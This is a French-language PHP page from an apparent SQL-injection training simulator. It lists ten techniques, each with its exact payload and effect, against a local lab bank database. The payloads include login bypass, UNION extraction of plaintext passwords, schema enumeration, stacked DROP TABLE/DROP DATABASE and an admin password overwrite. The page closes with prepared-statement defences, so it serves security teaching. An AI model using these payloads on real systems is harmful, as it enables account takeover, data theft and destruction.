<?php
$page_titre = 'Fiche des techniques - Simulateur SQLi';
require __DIR__ . '/includes/header.php';
?>
  <h1>Fiche des 10 techniques d'injection SQL</h1>
  <p class="hint">
    Pour chaque technique : le payload exact, o&ugrave; le saisir, et l'effet attendu.
    &laquo;&nbsp;Login&nbsp;&raquo; = formulaire de <a href="index.php">index.php</a>,
    &laquo;&nbsp;Compte&nbsp;&raquo; = <a href="compte.php">compte.php</a>,
    &laquo;&nbsp;phpMyAdmin&nbsp;&raquo; = console SQL de phpMyAdmin (onglet SQL sur la base <code>banque_test</code>).
    Les astuces destructrices (8, 9) sont r&eacute;cup&eacute;rables via <code>sql/02_reset.sql</code>.
  </p>

  <ol class="techniques">
    <li>
      <h3>1. Commentaire</h3>
      <p><strong>O&ugrave; :</strong> Login &rarr; champ <em>login</em>.</p>
      <p><strong>Payload :</strong> <code>bob' -- </code> (garder l'espace apr&egrave;s <code>--</code>)</p>
      <p><strong>Effet :</strong> le <code>--</code> commente la v&eacute;rification du mot de passe. On se connecte en tant que <code>bob</code> sans conna&icirc;tre son mot de passe.</p>
      <pre class="sql-echo">... WHERE users.login = 'bob' -- ' AND users.password = '...'</pre>
    </li>

    <li>
      <h3>2. Expression toujours vraie</h3>
      <p><strong>O&ugrave; :</strong> Login &rarr; champ <em>mot de passe</em> (login = <code>bob</code>).</p>
      <p><strong>Payload :</strong> <code>blabla' OR 1='1</code></p>
      <p><strong>Effet :</strong> la condition devient vraie pour toutes les lignes ; l'authentification est contourn&eacute;e.</p>
    </li>

    <li>
      <h3>3. Paralyser le SGBD (time-based)</h3>
      <p><strong>O&ugrave; :</strong> Compte &rarr; param&egrave;tre <em>id</em>.</p>
      <p><strong>Payload :</strong> <code>1-sleep(5)</code> (mets 15 pour reproduire la capture)</p>
      <p><strong>Effet :</strong> la r&eacute;ponse est retard&eacute;e du nombre de secondes indiqu&eacute; &mdash; preuve d'injection m&ecirc;me sans affichage (blind).</p>
      <pre class="sql-echo">SELECT id, owner, type, amount FROM account WHERE id = 1-sleep(5)</pre>
    </li>

    <li>
      <h3>4. UNION</h3>
      <p><strong>O&ugrave; :</strong> Compte &rarr; param&egrave;tre <em>id</em>.</p>
      <p><strong>Payload :</strong> <code>0 UNION SELECT id, login, password, 1 FROM users</code></p>
      <p><strong>Effet :</strong> on greffe le contenu de <code>users</code> (login + mot de passe en clair) dans le r&eacute;sultat. Le nombre de colonnes (4) doit correspondre &agrave; la requ&ecirc;te d'origine.</p>
    </li>

    <li>
      <h3>5. Export INTO OUTFILE</h3>
      <p><strong>O&ugrave; :</strong> phpMyAdmin (droit FILE requis).</p>
      <p><strong>Payload :</strong></p>
      <pre class="sql-echo">SELECT * FROM users INTO OUTFILE 'C:/xampp/mysql/data/fuite.txt';</pre>
      <p><strong>Effet :</strong> exporte la table dans un fichier serveur. Par d&eacute;faut MySQL r&eacute;pond
      <code>#1290 ... --secure-file-priv</code> : l'&eacute;criture n'est autoris&eacute;e que dans le dossier
      point&eacute; par <code>secure_file_priv</code>. Voir le README pour l'assouplir <em>en labo uniquement</em>.</p>
    </li>

    <li>
      <h3>6. R&eacute;cup&eacute;rer le sch&eacute;ma des tables</h3>
      <p><strong>O&ugrave; :</strong> phpMyAdmin (ou via UNION dans Compte).</p>
      <p><strong>Payload :</strong></p>
      <pre class="sql-echo">SELECT table_name, column_name, data_type
FROM information_schema.columns
WHERE table_schema = database();</pre>
      <p><strong>Effet :</strong> liste toutes les tables, colonnes et types de la base courante &mdash; on d&eacute;couvre la structure (dont <code>users.password</code>).</p>
    </li>

    <li>
      <h3>7. Error-based</h3>
      <p><strong>O&ugrave; :</strong> Compte &rarr; param&egrave;tre <em>id</em> (ou Login).</p>
      <p><strong>Payload :</strong> <code>1'</code></p>
      <p><strong>Effet :</strong> le guillemet en trop provoque une erreur <code>#1064</code> qui r&eacute;v&egrave;le un
      morceau de la requ&ecirc;te &mdash; utile pour cartographier l'injection.</p>
    </li>

    <li>
      <h3>8. Suppression de donn&eacute;es (empil&eacute;e)</h3>
      <p><strong>O&ugrave; :</strong> Login &rarr; champ <em>login</em> (index.php utilise <code>multi_query</code>).</p>
      <p><strong>Payload :</strong> <code>bob'; DROP TABLE account; -- </code></p>
      <p><strong>Effet :</strong> une deuxi&egrave;me requ&ecirc;te est ex&eacute;cut&eacute;e et supprime la table. <strong>Restauration :</strong> r&eacute;-importer <code>sql/01_install.sql</code>.</p>
      <p class="hint">Variante destructrice compl&egrave;te (capture) : <code>bob'; DROP DATABASE banque_test; -- </code></p>
    </li>

    <li>
      <h3>9. Mise &agrave; jour d'un mot de passe (empil&eacute;e)</h3>
      <p><strong>O&ugrave; :</strong> Login &rarr; champ <em>login</em>.</p>
      <p><strong>Payload :</strong> <code>bob'; UPDATE users SET password='1234' WHERE login='admin'; -- </code></p>
      <p><strong>Effet :</strong> le mot de passe du compte <code>admin</code> devient <code>1234</code>. V&eacute;rifiable ensuite via un login normal.</p>
    </li>

    <li>
      <h3>10. Mix / dump complet</h3>
      <p><strong>O&ugrave; :</strong> phpMyAdmin.</p>
      <p><strong>Effet :</strong> le script <code>sql/01_install.sql</code> est le sch&eacute;ma + dump complet (&eacute;quivalent de la derni&egrave;re capture) : il recr&eacute;e toute la base d'un coup, ce qui sert aussi de r&eacute;initialisation.</p>
    </li>
  </ol>

  <h2>Et la protection ?</h2>
  <p>
    La page <a href="secure.php">version s&eacute;curis&eacute;e</a> neutralise 1, 2, 8 et 9
    gr&acirc;ce aux requ&ecirc;tes pr&eacute;par&eacute;es (PDO, param&egrave;tres li&eacute;s) et au hachage des mots de passe
    (<code>password_hash</code> / <code>password_verify</code>). Voir le README pour la synth&egrave;se
    des protections.
  </p>

<?php require __DIR__ . '/includes/footer.php'; ?>
